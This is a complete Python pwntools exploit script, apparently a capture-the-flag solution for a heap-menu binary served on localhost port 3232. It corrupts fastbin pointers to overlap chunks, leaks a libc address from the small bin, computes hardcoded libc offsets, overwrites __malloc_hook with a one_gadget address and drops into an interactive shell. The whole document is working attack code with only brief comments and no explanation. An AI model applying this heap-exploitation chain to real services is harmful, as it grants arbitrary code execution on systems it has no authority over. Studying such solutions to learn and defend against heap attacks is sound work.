from pwn import *

def allocate(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.clean(0)
    print str(size) + " size chunk " + r.recvline(timeout=1)
    r.recvuntil(': ', timeout=1)

def fill(idx, content):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(content)))
    r.sendafter(': ', content)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')
    
def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')
    r.recvline()
    content = r.recvline()
    r.recvuntil(': ')
    return content



def exploit(r):
    allocate(0x20) # 0 f
    allocate(0x20) # 1 f
    allocate(0x20) # 2 f
    allocate(0x80) # 3 small
    allocate(0x20) # 4 f - prevent brk
    
    
    payload = b'\x00'*0x28 + b'\x31'
    fill(2, payload) # small bin size overwrite to bypass malloc size check
    
    free(2)
    free(1)
    
    payload = p64(0)*5
    payload += p64(0x31)
    payload += p8(0x90)
    fill(0, payload) # 1's fd overwrite
    allocate(0x20) # 1 f
    allocate(0x20) # 2 f overlap with 3
    
    payload = p64(0)*5
    payload += p64(0x31)
    payload += p64(0)*5
    payload += p8(0x91)
    fill(1, payload) # small bin size overwrite to bypass free size check
    
    free(3) # 3 small bin free

    main_arena88 = u64(dump(2)[:8]) # get small bin's fd
    libc_base = main_arena88 - 0x3be7b8
    mhook_adj = libc_base + 0x3be72d # malloc will return 0x3d, __malloc_hook addr is 0x40
    one_gadget = libc_base + 0xe66bd


    # 1, 2, 4 alive
    allocate(0x80) # 3 small. in order to fill empty space
    
    allocate(0x60) # 5 f
    allocate(0x60) # 6 f
    free(6)
    free(5) # 5's fd is created
    payload = p64(0)*5
    payload += p64(0x71)
    payload += p64(mhook_adj)
    fill(4, payload)
    allocate(0x60) # 5 f
    allocate(0x60) # 6 __malloc_hook chunk
    
    payload = p8(0)*3
    payload += p64(one_gadget)
    fill(6, payload)
    
    
    allocate(1)


    r.interactive()
    
    

if __name__ == "__main__":
    r = remote("127.0.0.1", 3232)

    #pause()
    
    exploit(r)
